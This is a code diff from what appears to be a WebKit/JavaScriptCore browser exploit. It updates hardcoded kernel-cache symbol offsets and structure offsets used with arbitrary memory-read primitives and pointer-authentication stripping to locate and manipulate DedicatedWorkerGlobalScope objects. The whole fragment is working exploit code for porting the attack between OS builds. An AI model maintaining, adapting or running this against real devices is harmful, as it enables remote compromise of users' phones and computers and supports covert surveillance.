@@ -84,11 +84,11 @@
             "JavaScriptCore__jitAllowList": 0x1ed7bea70n,
             "JavaScriptCore__jitAllowList_once": 0x1ed7be888n,
             "RemoteGraphicsContextGLWorkQueue": 0x1ed641758n,
-            "WebCore__DedicatedWorkerGlobalScope_vtable": 0x1f1432e30n,
+            "WebCore__DedicatedWorkerGlobalScope_vtable": 0x1f141deb8n,
             "WebCore__initPKContact_once": 0x1ed6245f8n,
             "WebCore__initPKContact_value": 0x1ed624600n,
             "WebCore__TelephoneNumberDetector_phoneNumbersScanner_value": 0x1eb084030n,
-            "WebCore__HTMLDocument_vtable": 0x1f1376268n,
+            "WebCore__HTMLDocument_vtable": 0x1f13671e0n,
             "DesktopServicesPriv_bss": 0x1ecff4080n,
             "GetCurrentThreadTLSIndex_CurrentThreadIndex": 0x280c6e460n,
             "pthread_create_jsc": 0x1998f5688n,
@@ -737,11 +737,11 @@
                     const key = read64(ptr);
                     if (!key) continue;
                     const context = read64(ptr + 0x20n);
-                    const vtable = read64(context).noPAC();
+                    const vtable = noPAC(read64(context));
                     //offsets.WebCore__DedicatedWorkerGlobalScope_vtable
                     if (vtable != offsets.WebCore__DedicatedWorkerGlobalScope_vtable) continue;
-                    const script = read64(context + 0x150n);
-                    const workerOrWorkletThread = read64(context + 0x160n);
+                    const script = read64(context + 0x160n);
+                    const workerOrWorkletThread = read64(context + 0x170n);
                     const thread = read64(workerOrWorkletThread + 0x28n);
                     const Strong_globalScopeWrapper = read64(script + 0x20n);
                     const globalScopeWrapper = read64(Strong_globalScopeWrapper);
